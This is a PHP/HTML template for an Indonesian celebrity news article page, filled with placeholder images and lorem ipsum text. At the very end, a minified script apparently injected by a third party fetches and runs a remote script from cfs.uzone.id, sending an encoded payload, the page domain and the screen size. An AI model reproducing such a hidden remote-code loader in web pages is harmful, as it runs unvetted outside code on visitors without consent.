<?php include 'artis.php' ?>
<?php
  $post_name = "Judul Artikel";
  $post_desc = "Deskripsi Artikel";
  $post_url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 ?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <?php include 'meta.php'; ?>
    <title>TauDuluan</title>

    <!-- Loading Bootstrap -->
    <link href="../css/vendor/bootstrap.min.css" rel="stylesheet">

    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">

    <!-- Loading Flat UI -->
    <link href="../css/flat-ui.min.css" rel="stylesheet">

    <!-- Costum CSS -->
    <link rel="stylesheet" href="../css/style.css">

    <link rel="shortcut icon" href="img/favicon.ico">

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements. All other JS at the end of file. -->
    <!--[if lt IE 9]>
      <script src="js/vendor/html5shiv.js"></script>
      <script src="js/vendor/respond.min.js"></script>
    <![endif]-->
  </head>
  <body>
    <?php include 'navbar.php'; ?>
  <div class="container">
      <div class="artis row">
        <div class="col-md-3">
          <img src="https://placehold.it/250x180?text=Artis" class="img-rounded"/>
        </div>
        <div class="col-md-6">
          <h3><?php echo $artis[0]; ?></h3>
          <h4>Penyanyi dan Aktor</h4>
        </div>
        <div class="col-md-3">
          <img src="https://placehold.it/200x200?text=Ads" class="img-rounded" />
        </div>
      </div>
      <hr>
      <div class="post">
        <h3>Lorem ipsum dolor sit amet.</h3>
        <h6>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut
          labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris
          nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit
          esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt
          in culpa qui officia deserunt mollit anim id est laborum.
          <br><br>
          Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut
          labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris
          nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit
          esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt
          in culpa qui officia deserunt mollit anim id est laborum.
          <br><br>
          Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut
          labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris
          nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit
          esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt
          culpa qui officia deserunt mollit anim id est laborum.
          <br><br>
          Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut
          labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris
          nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit
          esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt
          in culpa qui officia deserunt mollit anim id est laborum.
      </div>
      <div class="col-md-8">
        <?php include 'comment.php'; ?>
      </div>
      <div class="pull-right col-md-4">
        <a class="btn btn-share facebook"><i class="fa fa-facebook"></i> Share</a>
        <a class="btn btn-share twitter"><i class="fa fa-twitter"></i> Share</a>
      </div><br><br>
      <br><?php include 'footer.php' ?>
  </div>
  <!-- /.container -->

    <!-- jQuery (necessary for Flat UI's JavaScript plugins) -->
    <script src="js/vendor/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="js/flat-ui.min.js"></script>

  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpn4r0dea1NvXLPmJ5XRtqgzCLYO2812KEWbSvjw9pewSArhWQLbUqr1xBjuhKpcSQGGjQuAfi8aNZ2Qe4Fmx5v8PK%2bDrgne9xVs3%2fnkkFvYx21Okwy%2b04FtV9cHflFh5YKh%2beqbXGmr8ffo%2bxmqwtnMJb7MId61su%2fN0aqOhV0mdajxc7GI0kuWCjcGuJsWI7fR5P1f8vONRY5fzDSX0xOqTqKo3GClbmPlx9%2fIz9vrjOo7e61F3WE2ChwHJoz9brW%2fzVvn%2fzkl3VkNAJhkjEFRF%2bFuU9bxqHfyX%2fVqwCsqYEac9MAvrWi%2b%2fOvTz97DAyzlEbbsrpzrmHhZtF%2byJfzc%2bvSQ1U%2fRWhh4BB8ES3NZILEPuW%2fgGVgJeImg%2b%2fJjS8hwskgR7WH%2bwFyDLxfI60SglytAKlH9xqNcjFeQNPYCAa8kDjpXK%2fpydJRc0qto4fsaygo2pzAZP1%2bSAQbyD2O%2fFvpnceZWpt2rHtV%2bf35ysaHmdc%2fRhqlwTVqqCcCFgLUWI47ZmLCoOa0F1p3Oy567nCMum2SPmIAorzbER426hI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
